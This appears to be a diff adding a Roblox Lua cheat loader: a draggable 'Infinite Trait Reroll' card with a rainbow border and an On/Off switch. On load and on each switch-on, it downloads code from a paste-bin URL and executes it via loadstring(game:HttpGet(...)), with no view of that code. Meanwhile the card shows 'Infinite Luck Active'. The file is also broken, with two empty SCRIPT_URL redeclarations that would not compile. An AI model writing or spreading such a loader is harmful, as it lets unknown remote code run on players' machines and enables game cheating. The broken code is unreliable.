@@ -1,0 +1,255 @@
+-- Infinite Trait Reroll UI
+-- Draggable card with an animated rainbow border and an On/Off switch.
+-- Turning the switch ON runs the loadstring below.
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local SCRIPT_URL = "https://cdn.sourceb.in/bins/vrtsIzTacX/0"
+
+local SCRIPT_URL = 
+
+local SCRIPT_URL = 
+
+-- Remove an older copy if the script is run twice
+local function getParent()
+	local ok, ui = pcall(function()
+		return (gethui and gethui()) or game:GetService("CoreGui")
+	end)
+	if ok and ui then return ui end
+	return Players.LocalPlayer:WaitForChild("PlayerGui")
+end
+
+local parent = getParent()
+local old = parent:FindFirstChild("InfiniteTraitRerollUI")
+if old then old:Destroy() end
+
+local ON_COLOR = Color3.fromRGB(61, 220, 95)
+local OFF_COLOR = Color3.fromRGB(74, 72, 82)
+local MUTED = Color3.fromRGB(169, 166, 179)
+
+local RAINBOW = ColorSequence.new({
+	ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 95, 126)),
+	ColorSequenceKeypoint.new(0.20, Color3.fromRGB(255, 179, 107)),
+	ColorSequenceKeypoint.new(0.40, Color3.fromRGB(246, 226, 122)),
+	ColorSequenceKeypoint.new(0.60, Color3.fromRGB(107, 224, 143)),
+	ColorSequenceKeypoint.new(0.80, Color3.fromRGB(107, 181, 255)),
+	ColorSequenceKeypoint.new(1.00, Color3.fromRGB(181, 139, 255)),
+})
+
+local TITLE_GRADIENT = ColorSequence.new({
+	ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 107, 138)),
+	ColorSequenceKeypoint.new(0.30, Color3.fromRGB(255, 179, 107)),
+	ColorSequenceKeypoint.new(0.50, Color3.fromRGB(242, 224, 124)),
+	ColorSequenceKeypoint.new(0.70, Color3.fromRGB(123, 227, 176)),
+	ColorSequenceKeypoint.new(1.00, Color3.fromRGB(107, 181, 255)),
+})
+
+-- ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "InfiniteTraitRerollUI"
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+gui.Parent = parent
+
+-- Card
+local card = Instance.new("Frame")
+card.Name = "Card"
+card.Size = UDim2.fromOffset(420, 110)
+card.AnchorPoint = Vector2.new(0.5, 0)
+card.Position = UDim2.new(0.5, 0, 0.2, 0)
+card.BackgroundColor3 = Color3.fromRGB(18, 18, 20)
+card.BorderSizePixel = 0
+card.Active = true
+card.Parent = gui
+
+-- Overall size. Lower = smaller (0.55 is small, 0.7 is medium, 1 is full size)
+local CARD_SCALE = 0.55
+local cardScale = Instance.new("UIScale")
+cardScale.Scale = CARD_SCALE
+cardScale.Parent = card
+
+local cardCorner = Instance.new("UICorner")
+cardCorner.CornerRadius = UDim.new(0, 30)
+cardCorner.Parent = card
+
+local stroke = Instance.new("UIStroke")
+stroke.Thickness = 3
+stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+stroke.Color = Color3.new(1, 1, 1)
+stroke.Parent = card
+
+local strokeGradient = Instance.new("UIGradient")
+strokeGradient.Color = RAINBOW
+strokeGradient.Parent = stroke
+
+-- Status dot
+local dot = Instance.new("Frame")
+dot.Name = "Dot"
+dot.Size = UDim2.fromOffset(16, 16)
+dot.Position = UDim2.fromOffset(26, 24)
+dot.BackgroundColor3 = ON_COLOR
+dot.BorderSizePixel = 0
+dot.Parent = card
+Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.BackgroundTransparency = 1
+title.Position = UDim2.fromOffset(54, 14)
+title.Size = UDim2.fromOffset(250, 36)
+title.Font = Enum.Font.GothamBlack
+title.Text = "Infinite Trait Reroll"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextSize = 22
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = card
+
+local titleGradient = Instance.new("UIGradient")
+titleGradient.Color = TITLE_GRADIENT
+titleGradient.Parent = title
+
+-- Status text
+local status = Instance.new("TextLabel")
+status.Name = "Status"
+status.BackgroundTransparency = 1
+status.Position = UDim2.fromOffset(28, 64)
+status.Size = UDim2.fromOffset(250, 24)
+status.Font = Enum.Font.GothamMedium
+status.Text = "Infinite Luck Active 🍀"
+status.TextColor3 = MUTED
+status.TextSize = 14
+status.TextXAlignment = Enum.TextXAlignment.Left
+status.Parent = card
+
+-- Toggle
+local toggle = Instance.new("TextButton")
+toggle.Name = "Toggle"
+toggle.AnchorPoint = Vector2.new(1, 0.5)
+toggle.Position = UDim2.new(1, -22, 0.5, 0)
+toggle.Size = UDim2.fromOffset(84, 50)
+toggle.BackgroundColor3 = ON_COLOR
+toggle.AutoButtonColor = false
+toggle.Text = ""
+toggle.BorderSizePixel = 0
+toggle.Parent = card
+Instance.new("UICorner", toggle).CornerRadius = UDim.new(1, 0)
+
+local toggleLabel = Instance.new("TextLabel")
+toggleLabel.BackgroundTransparency = 1
+toggleLabel.Size = UDim2.fromOffset(40, 50)
+toggleLabel.Position = UDim2.fromOffset(14, 0)
+toggleLabel.Font = Enum.Font.GothamBlack
+toggleLabel.Text = "On"
+toggleLabel.TextColor3 = Color3.fromRGB(11, 61, 25)
+toggleLabel.TextSize = 15
+toggleLabel.TextXAlignment = Enum.TextXAlignment.Left
+toggleLabel.Parent = toggle
+
+local knob = Instance.new("Frame")
+knob.Name = "Knob"
+knob.Size = UDim2.fromOffset(42, 42)
+knob.Position = UDim2.fromOffset(38, 4)
+knob.BackgroundColor3 = Color3.new(1, 1, 1)
+knob.BorderSizePixel = 0
+knob.Parent = toggle
+Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
+
+-- State
+local enabled = true
+local running = false
+
+local function runScript()
+	if running then return end
+	running = true
+	task.spawn(function()
+		local ok, err = pcall(function()
+			loadstring(game:HttpGet(SCRIPT_URL))()
+		end)
+		if not ok then
+			warn("[Infinite Trait Reroll] Script failed: " .. tostring(err))
+			status.Text = "Script failed to load"
+			status.TextColor3 = Color3.fromRGB(255, 130, 150)
+		end
+		running = false
+	end)
+end
+
+local tweenInfo = TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+
+local function render()
+	TweenService:Create(toggle, tweenInfo, {
+		BackgroundColor3 = enabled and ON_COLOR or OFF_COLOR,
+	}):Play()
+	TweenService:Create(knob, tweenInfo, {
+		Position = enabled and UDim2.fromOffset(38, 4) or UDim2.fromOffset(4, 4),
+	}):Play()
+	TweenService:Create(dot, tweenInfo, {
+		BackgroundColor3 = enabled and ON_COLOR or OFF_COLOR,
+	}):Play()
+
+	toggleLabel.Text = enabled and "On" or "Off"
+	toggleLabel.Position = enabled and UDim2.fromOffset(14, 0) or UDim2.fromOffset(44, 0)
+	toggleLabel.TextColor3 = enabled and Color3.fromRGB(11, 61, 25) or Color3.fromRGB(207, 203, 216)
+
+	status.Text = enabled and "Infinite Luck Active 🍀" or "Infinite Luck Inactive"
+	status.TextColor3 = MUTED
+end
+
+toggle.MouseButton1Click:Connect(function()
+	enabled = not enabled
+	render()
+	if enabled then
+		runScript()
+	end
+end)
+
+-- Animated rainbow border
+local rotation = 0
+local borderConn = RunService.RenderStepped:Connect(function(dt)
+	if enabled then
+		rotation = (rotation + dt * 90) % 360
+		strokeGradient.Rotation = rotation
+	end
+end)
+
+-- Dragging (mouse and touch)
+local dragging = false
+local dragStart, startPos
+
+card.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = card.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+		or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta = input.Position - dragStart
+		card.Position = UDim2.new(
+			startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+-- Clean up the border animation if the UI is removed
+gui.Destroying:Connect(function()
+	borderConn:Disconnect()
+end)
+
+-- Starts on, so run the script once on load
+render()
+runScript()
